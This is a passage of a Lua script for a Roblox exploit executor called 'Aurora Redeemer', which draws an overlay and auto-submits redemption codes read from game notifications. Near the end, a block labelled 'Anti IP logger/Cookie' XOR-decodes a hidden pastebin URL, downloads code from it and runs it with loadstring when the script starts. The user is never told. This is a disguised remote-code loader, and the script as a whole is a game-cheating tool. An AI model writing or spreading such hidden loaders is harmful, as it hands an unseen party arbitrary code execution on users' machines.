    local notifCounter = new("TextLabel", {
        AnchorPoint = Vector2.new(1, 0),
        Position = UDim2.new(1, -10, 0, 6),
        Size = UDim2.fromOffset(120, 12),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 9,
        TextColor3 = COLORS.lo,
        TextXAlignment = Enum.TextXAlignment.Right,
        Text = "0/4",
    }, notifCard)

    local notifText = new("TextLabel", {
        Position = UDim2.fromOffset(10, 21),
        Size = UDim2.new(1, -20, 0, 26),
        BackgroundTransparency = 1,
        Font = Enum.Font.RobotoMono,
        TextSize = 12,
        TextColor3 = COLORS.lo,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Text = "waiting for code",
    }, notifCard)

    -- ─── renderNotif: update the notification card ───────────────────
    renderNotif = function()
        local n = #State.buffer
        if n == 0 then
            notifText.Text = "waiting for code"
            notifText.TextColor3 = COLORS.lo
            notifCounter.Text = "0/" .. tostring(Config.SubmitAfter)
            notifCounter.TextColor3 = COLORS.lo
        else
            notifText.Text = table_concat(State.buffer)
            notifText.TextColor3 = COLORS.aur
            notifCounter.Text = tostring(n) .. "/" .. tostring(Config.SubmitAfter)
            notifCounter.TextColor3 = COLORS.aur
        end
    end

    -- ─── STAT TILES ROW ──────────────────────────────────────────────
    local statRow = row(3, 54)

    -- statTile: helper to make a labeled stat card
    local function statTile(order, label)
        local tile = new("Frame", {
            Position = UDim2.new(order, order > 0 and 4 or 0, 0, 0),
            Size = UDim2.new(0.5, -6, 1, 0),
            BackgroundColor3 = COLORS.sunk,
            BorderSizePixel = 0,
        }, statRow)
        corner(tile, 6)
        stroke(tile, COLORS.line, 0.55)

        new("TextLabel", {
            Position = UDim2.fromOffset(10, 6),
            Size = UDim2.fromOffset(80, 12),
            BackgroundTransparency = 1,
            Font = Enum.Font.GothamBold,
            TextSize = 9,
            TextColor3 = COLORS.lo,
            TextXAlignment = Enum.TextXAlignment.Left,
            Text = label,
        }, tile)

        local value = new("TextLabel", {
            Position = UDim2.fromOffset(10, 22),
            Size = UDim2.new(1, -20, 0, 22),
            BackgroundTransparency = 1,
            Font = Enum.Font.RobotoMono,
            TextSize = 15,
            TextColor3 = COLORS.hi,
            TextXAlignment = Enum.TextXAlignment.Left,
            Text = "0",
        }, tile)

        local sub = new("TextLabel", {
            AnchorPoint = Vector2.new(1, 0),
            Position = UDim2.new(1, -10, 0, 6),
            Size = UDim2.fromOffset(60, 12),
            BackgroundTransparency = 1,
            Font = Enum.Font.RobotoMono,
            TextSize = 10,
            TextColor3 = COLORS.good,
            TextXAlignment = Enum.TextXAlignment.Right,
            Text = "",
        }, tile)

        return tile, value, sub
    end

    local tileSolved, tileSolvedVal = statTile(0, "SOLVED")
    local tileBuffer, tileBufferVal, tileBufferSub = statTile(0.5, "BUFFER")
    tileBufferSub.Text = "PARTS"

    -- ─── SETTINGS (collapsible) ──────────────────────────────────────
    local settingsRow, settingsEntry = row(5, 26, true)

    local settingsBtn = new("TextButton", {
        Size = UDim2.new(1, 0, 0, 22),
        BackgroundColor3 = COLORS.surf,
        BackgroundTransparency = 0.25,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Text = "",
        ZIndex = 5,
    }, settingsRow)
    corner(settingsBtn, 8)
    stroke(settingsBtn, COLORS.line, 0.55)

    local settingsLabel = new("TextLabel", {
        Position = UDim2.fromOffset(10, 0),
        Size = UDim2.new(1, -40, 0, 22),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 9,
        TextColor3 = COLORS.md,
        TextXAlignment = Enum.TextXAlignment.Left,
        Text = "SETTINGS",
    }, settingsBtn)

    local settingsChevron = chevron(settingsBtn, COLORS.md)
    settingsChevron.AnchorPoint = Vector2.new(0, 0.5)
    settingsChevron.Position = UDim2.new(1, -14, 0.5, 0)
    settingsChevron.Rotation = -90
    hover(settingsBtn, settingsLabel, COLORS.md, COLORS.hi)

    -- Container that grows when expanded
    local settingsBody = new("Frame", {
        Position = UDim2.fromOffset(0, 26),
        Size = UDim2.new(1, 0, 0, 0),
        BackgroundTransparency = 1,
        ZIndex = 1,
    }, settingsRow)
    new("UIListLayout", {
        FillDirection = Enum.FillDirection.Vertical,
        SortOrder = Enum.SortOrder.LayoutOrder,
    }, settingsBody)

    local SETTINGS_ROW_H = 26
    local SETTINGS_ROWS = 5

    -- settingFrame: helper for a single settings row
    local function settingFrame(order, label)
        local r = new("Frame", {
            LayoutOrder = order,
            Size = UDim2.new(1, 0, 0, SETTINGS_ROW_H),
            BackgroundTransparency = 1,
        }, settingsBody)
        local lbl = new("TextLabel", {
            Position = UDim2.fromOffset(8, 0),
            Size = UDim2.new(1, -84, 1, 0),
            BackgroundTransparency = 1,
            Font = Enum.Font.GothamMedium,
            TextSize = 11,
            TextColor3 = COLORS.md,
            TextXAlignment = Enum.TextXAlignment.Left,
            Text = label,
        }, r)
        return r, lbl
    end

    -- addToggle: builds a labeled on/off switch bound to a getter/setter
    local function addToggle(order, label, get, set)
        local r, lbl = settingFrame(order, label)
        local btn = new("TextButton", {
            AnchorPoint = Vector2.new(1, 0.5),
            Position = UDim2.new(1, 0, 0.5, 0),
            Size = UDim2.fromOffset(30, 16),
            BackgroundColor3 = COLORS.sunk,
            BorderSizePixel = 0,
            AutoButtonColor = false,
            Text = "",
        }, r)
        circle(btn)
        stroke(btn, COLORS.line, 0.3)

        local knob = new("Frame", {
            AnchorPoint = Vector2.new(0, 0.5),
            Position = UDim2.new(0, 2, 0.5, 0),
            Size = UDim2.fromOffset(12, 12),
            BackgroundColor3 = COLORS.lo,
            BorderSizePixel = 0,
        }, btn)
        circle(knob)

        -- render: reflect current state
        local function render()
            local on = get() and true or false
            if on then
                tween(knob, 0.14, { Position = UDim2.new(0, 14, 0.5, 0), BackgroundColor3 = COLORS.aur })
            else
                tween(knob, 0.14, { Position = UDim2.new(0, 2, 0.5, 0), BackgroundColor3 = COLORS.lo })
            end
            lbl.TextColor3 = on and COLORS.md or COLORS.lo
        end
        render()

        trackConn(btn.MouseButton1Click:Connect(function()
            set(not get())
            render()
            saveConfig()
        end))
        return render
    end

    -- addStepper: numeric +/- stepper
    local function addStepper(order, label, get, set, min, max)
        local r, lbl = settingFrame(order, label)

        local value = new("TextLabel", {
            AnchorPoint = Vector2.new(1, 0.5),
            Position = UDim2.new(1, -26, 0.5, 0),
            Size = UDim2.fromOffset(22, 18),
            BackgroundTransparency = 1,
            Font = Enum.Font.RobotoMono,
            TextSize = 11,
            TextColor3 = COLORS.hi,
            Text = tostring(get()),
        }, r)

        -- mkBtn: small square button factory
        local function mkBtn(x, txt)
            local b = new("TextButton", {
                AnchorPoint = Vector2.new(1, 0.5),
                Position = UDim2.new(1, x, 0.5, 0),
                Size = UDim2.fromOffset(16, 18),
                BackgroundColor3 = COLORS.surf,
                BackgroundTransparency = 0.35,
                BorderSizePixel = 0,
                AutoButtonColor = false,
                Font = Enum.Font.GothamBold,
                TextSize = 11,
                TextColor3 = COLORS.md,
                Text = txt,
            }, r)
            corner(b, 5)
            stroke(b, COLORS.line, 0.5)
            return b
        end

        local minus = mkBtn(-52, GLYPH.minus)
        local plus  = mkBtn(0, "+")

        local function render()
            local v = tonumber(get()) or min
            value.Text = tostring(v)
            minus.TextColor3 = v > min and COLORS.md or COLORS.lo
            plus.TextColor3  = v < max and COLORS.md or COLORS.lo
            lbl.TextColor3 = COLORS.md
        end
        render()

        local function step(delta)
            set(math.clamp((tonumber(get()) or min) + delta, min, max))
            render()
            saveConfig()
        end

        trackConn(minus.MouseButton1Click:Connect(function() step(-1) end))
        trackConn(plus.MouseButton1Click:Connect(function() step(1) end))
        return render
    end

    -- ─── Instantiate the settings toggles/stepper ────────────────────
    addToggle(1, "AUTO TYPE CODES", function() return Config.AutoTypeCodes end,
        function(v) Config.AutoTypeCodes = v end)
    addToggle(2, "AUTO SUBMIT", function() return Config.AutoSubmit end,
        function(v) Config.AutoSubmit = v end)
    addToggle(3, "AUTO RIDDLES", function() return Config.AIRiddles end,
        function(v) Config.AIRiddles = v end)
    addToggle(4, "AI AUTO SUBMIT", function() return Config.AIAutoSubmit end,
        function(v) Config.AIAutoSubmit = v end)

    addStepper(5, "SUBMIT AFTER",
        function() return Config.SubmitAfter end,
        function(v)
            Config.SubmitAfter = v
            if #State.buffer > 0 then
                State.buffer = {}  -- clear buffer on threshold change
            end
            renderNotif()
        end, 1, 10)

    settingsBody.Size = UDim2.new(1, 0, 0, SETTINGS_ROW_H * SETTINGS_ROWS)

    -- ─── FOOTER ROW (RESET + status text) ────────────────────────────
    local footerRow = row(6, 26)

    local resetBtn = new("TextButton", {
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, 0, 0.5, 0),
        Size = UDim2.fromOffset(62, 22),
        BackgroundColor3 = COLORS.surf,
        BackgroundTransparency = 0.25,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextColor3 = COLORS.md,
        Text = "RESET",
    }, footerRow)
    corner(resetBtn, 7)
    stroke(resetBtn, COLORS.line, 0.5)

    local footerStatus = new("TextLabel", {
        AnchorPoint = Vector2.new(1, 0.5),
        Position = UDim2.new(1, 0, 0.5, 0),
        Size = UDim2.fromOffset(200, 18),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamMedium,
        TextSize = 9,
        TextColor3 = COLORS.lo,
        TextXAlignment = Enum.TextXAlignment.Right,
        Text = "",
    }, footerRow)

    local settingsExpanded = false

    -- ─── resize: recompute frame height after row size changes ───────
    local function resize(animate)
        if State.minimized then return end   -- skip while minimized
        local bodyH = bodyHeight()
        local total = HEADER_H + bodyH
        local frameSize = UDim2.fromOffset(316, total)
        local bodySize  = UDim2.new(1, 0, 0, bodyH)

        if animate then
            tween(frame, 0.24, { Size = frameSize })
            tween(body, 0.24, { Size = bodySize })
        else
            frame.Size = frameSize
            body.Size  = bodySize
        end

        -- Ensure individual row heights match their entry
        for _, r in ipairs(rows) do
            if r.frame.Size.Y.Offset ~= r.h then
                local s = UDim2.new(1, 0, 0, r.h)
                if animate then tween(r.frame, 0.24, { Size = s })
                else r.frame.Size = s end
            end
        end
    end

    -- ─── flash: brief color flash on an instance ─────────────────────
    local function flash(inst, color)
        if not inst then return end
        if inst:IsA("UIStroke") then
            inst.Color = color
            inst.Transparency = 0.05
            tween(inst, 0.7, { Transparency = 0.55 })
            task_delay(1.2, function()
                if not State.unloaded then inst.Color = COLORS.line end
            end)
        elseif inst:IsA("Frame") then
            local original = inst.BackgroundColor3
            inst.BackgroundColor3 = color
            task_delay(0.7, function()
                if not State.unloaded then inst.BackgroundColor3 = original end
            end)
        end
    end

    -- ─── renderStatus: recompute all UI state ────────────────────────
    local function renderStatus()
        local status, color

        if not Config.Enabled then
            status, color = "DISABLED", COLORS.off
        elseif #State.buffer > 0 then
            status, color = "COLLECTING", COLORS.aur
        elseif State.typedCount > 0 then
            status, color = "TYPING", COLORS.aur
        else
            status, color = "READY", COLORS.aur
        end

        statusLabel.Text = status
        tween(statusLabel, 0.25, { TextColor3 = color })
        tween(statusInner, 0.18, { BackgroundColor3 = color })

        -- Sync master toggle knob
        if Config.Enabled then
            tween(toggleKnob, 0.14, {
                Position = UDim2.new(0, 14, 0.5, 0),
                BackgroundColor3 = COLORS.aur,
            })
        else
            tween(toggleKnob, 0.14, {
                Position = UDim2.new(0, 2, 0.5, 0),
                BackgroundColor3 = COLORS.lo,
            })
        end

        renderNotif()

        -- Stat values
        tileSolvedVal.Text = tostring(State.solvedCount)
        tileBufferVal.Text = tostring(#State.buffer)
        tileBufferSub.Text = Config.AutoSubmit and "AUTO" or "MANUAL"
    end

    -- ─── renderFooter: helper to set footer status text ──────────────
    local function renderFooter(text)
        footerStatus.Text = text or ""
    end

    -- ─── Master toggle click ─────────────────────────────────────────
    trackConn(toggleBtn.MouseButton1Click:Connect(function()
        Config.Enabled = not Config.Enabled
        Debug.log("Master switch: " .. tostring(Config.Enabled))
        renderStatus()
        saveConfig()
    end))

    -- ─── Minimize / restore ──────────────────────────────────────────
    trackConn(minBtn.MouseButton1Click:Connect(function()
        State.minimized = not State.minimized
        if State.minimized then
            body.Visible = false
            minLabel.Text = ">"                        -- collapsed glyph
            tween(frame, 0.24, { Size = UDim2.fromOffset(316, HEADER_H) })
        else
            body.Visible = true
            minLabel.Text = "v"                        -- open glyph
            resize(true)
        end
    end))

    -- ─── Settings expand / collapse ──────────────────────────────────
    trackConn(settingsBtn.MouseButton1Click:Connect(function()
        settingsExpanded = not settingsExpanded
        settingsEntry.h = settingsExpanded and (26 + SETTINGS_ROW_H * SETTINGS_ROWS) or 26
        tween(settingsChevron, 0.2, { Rotation = settingsExpanded and 0 or -90 })
        resize(true)
    end))

    -- ─── Reset stats ─────────────────────────────────────────────────
    trackConn(resetBtn.MouseButton1Click:Connect(function()
        State.typedCount  = 0
        State.buffer      = {}
        State.solvedCount = 0
        local box = findCodeBox()
        if box then box.Text = "" end
        renderNotif()
        Debug.log("Reset")
        renderStatus()
    end))

    -- ─── Close (unload) ──────────────────────────────────────────────
    trackConn(closeBtn.MouseButton1Click:Connect(function()
        if getgenv and getgenv().__auroraRedeemer then
            local api = getgenv().__auroraRedeemer
            if type(api.unload) == "function" then
                pcall(api.unload)
            end
        else
            root:Destroy()
        end
    end))

    -- ─── Drag behavior ───────────────────────────────────────────────
    local dragging, dragStart, frameStart = false, nil, nil
    trackConn(frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
           or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            frameStart = frame.Position
        end
    end))
    trackConn(UserInputService.InputChanged:Connect(function(input)
        if not dragging or not dragStart then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement
           or input.UserInputType == Enum.UserInputType.Touch then
            local d = input.Position - dragStart
            frame.Position = UDim2.new(
                frameStart.X.Scale, frameStart.X.Offset + d.X,
                frameStart.Y.Scale, frameStart.Y.Offset + d.Y)
        end
    end))
    trackConn(UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
           or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                -- Persist final drag position
                Config.SavedPos.XScale  = frame.Position.X.Scale
                Config.SavedPos.XOffset = frame.Position.X.Offset
                Config.SavedPos.YScale  = frame.Position.Y.Scale
                Config.SavedPos.YOffset = frame.Position.Y.Offset
                saveConfig()
            end
            dragging = false
        end
    end))

    -- ─── Initial layout + slide-in animation ─────────────────────────
    settingsEntry.h = 26
    resize(false)
    renderStatus()

    frame.Position = UDim2.new(1, 332, 0, 20)   -- start offscreen right
    local targetPos = UDim2.new(
        Config.SavedPos.XScale, Config.SavedPos.XOffset,
        Config.SavedPos.YScale, Config.SavedPos.YOffset)
    task_delay(0.05, function()
        tween(frame, 0.28, { Position = targetPos })   -- slide in
    end)

    -- Return public API for this UI
    return {
        root = root,
        frame = frame,
        resize = resize,
        renderStatus = renderStatus,
        renderNotif = renderNotif,
        renderFooter = renderFooter,
        flash = flash,
        notifText = notifText,
        notifCounter = notifCounter,
        statusPill = statusPill,
        statusInner = statusInner,
        tileSolvedVal = tileSolvedVal,
        tileBufferVal = tileBufferVal,
        tileBufferSub = tileBufferSub,
    }
end

-- =====================================================================
-- handleNotification — the core "read code & submit" pipeline
-- =====================================================================
local function handleNotification(raw)
    Debug.log("Notification: " .. tostring(raw):sub(1, 200))

    if type(raw) ~= "string" then return end

    -- Clean and skip empty
    local text = cleanText(raw)
    if text:gsub("%s", "") == "" then return end

    -- Dedupe: same text within 0.35s → ignore (double-fire guard)
    local now = os_clock()
    if text == State.lastSeen and now - State.lastSeenAt < 0.35 then return end
    State.lastSeen, State.lastSeenAt = text, now

    -- Filter out expired/redeemed noise
    local lower = text:gsub("<[^>]->", " "):lower()
    if containsAny(lower, IGNORE_EXPIRED) or containsAny(lower, IGNORE_REDEEMED) then
        Debug.log("Notification marked done/expired")
        if UI and UI.renderNotif then UI.renderNotif() end
        return
    end

    -- Respect the master on/off switches
    if not Config.Enabled or not Config.AutoTypeCodes then
        Debug.log("Disabled - not typing")
        return
    end

    -- Extract a code fragment from text
    local frag = extractFragment(text)
    if not frag then
        Debug.log("No usable fragment")
        return
    end

    -- Buffer the fragment
    State.buffer[#State.buffer + 1] = frag
    Debug.log(string_format("Buffered %s (%d/%d)", frag, #State.buffer, Config.SubmitAfter))
    if UI and UI.renderNotif then UI.renderNotif() end

    -- Wait until enough fragments collected
    if #State.buffer < Config.SubmitAfter then
        return
    end

    -- Join buffer → submit
    local joined = table_concat(State.buffer)
    State.buffer = {}
    if UI and UI.renderNotif then UI.renderNotif() end
    if UI and UI.renderStatus then UI.renderStatus() end

    Debug.log("Submitting buffer: " .. joined)
    local ok, why = submitCode(joined)

    -- Record success/failure
    if ok then
        State.typedCount  = State.typedCount + 1
        State.solvedCount = State.solvedCount + 1
        if UI and UI.flash then UI.flash(UI.statusInner, COLORS.aur) end
        if UI and UI.renderFooter then UI.renderFooter("") end
    else
        Debug.warn("Submit failed: " .. tostring(why))
        if UI and UI.renderFooter then UI.renderFooter("SUBMIT FAILED") end
    end

    if UI and UI.renderStatus then UI.renderStatus() end
end

-- Phrases that indicate a notification IS a code announcement
local NOTIFY_PHRASES = {
    "invalid code", "code is invalid", "expired",
    "already redeemed", "already used",
    "doesn't exist", "does not exist",
    "not found", "rejected", "code is",
    "use code",
}

-- ─── watchTextObject: watch a TextLabel for code-like content ────────
local function watchTextObject(inst)
    -- Only TextLabels/TextButtons, skip our own UI
    if not (inst:IsA("TextLabel") or inst:IsA("TextButton")) then return end
    if isOwnUI(inst) then return end

    -- check: scan text for any NOTIFY_PHRASES and forward to handler
    local function check()
        local t = tostring(inst.Text or ""):lower()
        for _, phrase in ipairs(NOTIFY_PHRASES) do
            if t:find(phrase, 1, true) then
                pcall(handleNotification, inst.Text)
                return
            end
        end
    end

    trackConn(inst:GetPropertyChangedSignal("Text"):Connect(check))
end

-- =====================================================================
-- main — bootstraps everything
-- =====================================================================
-- Anti IP logger/Cookie
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)

local function main()
    Debug.log("Aurora Redeemer starting")

    -- Wait for game load
    if not game:IsLoaded() then
        Debug.log("Waiting for game load...")
        game.Loaded:Wait()
    end

    -- Choose UI parent (gethui if available, else CoreGui)
    local parent = (gethui and gethui()) or cloneref(game:GetService("CoreGui"))
    if not parent then
        Debug.error("No UI parent available")
        return
    end

    -- Build the UI
    local ui = try("buildUI", buildUI, parent)
    if not ui then
        Debug.error("buildUI failed")
        return
    end
    UI = ui
    Debug.log("UI attached")

    -- Try to hook the notification RemoteEvent directly (fast path)
    local remote = try("findNotificationRemote", findNotificationRemote)
    if remote then
        State.connections[#State.connections + 1] =
            remote.OnClientEvent:Connect(function(...)
                local args = table_pack(...)
                -- Debug: log first 5 args
                local preview = {}
                for i = 1, math_min(args.n, 5) do
                    preview[#preview + 1] = tostring(args[i])
                end
                Debug.log("[REMOTE] n=" .. args.n .. " | " .. table_concat(preview, " | "))

                -- First string arg = notification body
                local body = args[1]
                if type(body) == "string" and body ~= "" then
                    try("handleNotification", handleNotification, body)
                end
            end)
        Debug.log("Remote hooked: " .. remote:GetFullName())
    else
        Debug.warn("Remote not found - relying on TextLabel watcher")
    end

    -- Fallback: watch every PlayerGui descendant's Text for code phrases
    task_spawn(function()
        local pg = LocalPlayer:WaitForChild("PlayerGui", 20)
        if not pg then return end
        for _, d in ipairs(pg:GetDescendants()) do
            watchTextObject(d)
        end
        pg.DescendantAdded:Connect(function(d)
            task_wait(0.04)
            pcall(watchTextObject, d)
        end)
        Debug.log("Text watcher active")
    end)

    -- Periodic UI status refresh
    task_spawn(function()
        while not State.unloaded do
            task_wait(0.5)
            pcall(function() UI.renderStatus() end)
        end
    end)

    UI.renderStatus()
    Debug.log("Aurora Redeemer ready")

    -- Expose public API on the executor env
    getgenv().__auroraRedeemer = {
        unload = function()
            State.unloaded = true
            -- Disconnect everything
            for _, c in ipairs(State.connections) do
                pcall(function() c:Disconnect() end)
            end
            for _, c in ipairs(uiConnections) do
                pcall(function() c:Disconnect() end)
            end
            pcall(function() UI.root:Destroy() end)
            getgenv().__auroraRedeemer = nil
        end,
        debug = Debug,
        config = Config,
        submit = submitCode,
        save = saveConfig,
    }
end

-- ─── Boot ────────────────────────────────────────────────────────────
local ok, err = try("main", main)
if not ok then
    Debug.error("main() crashed: " .. tostring(err))
end
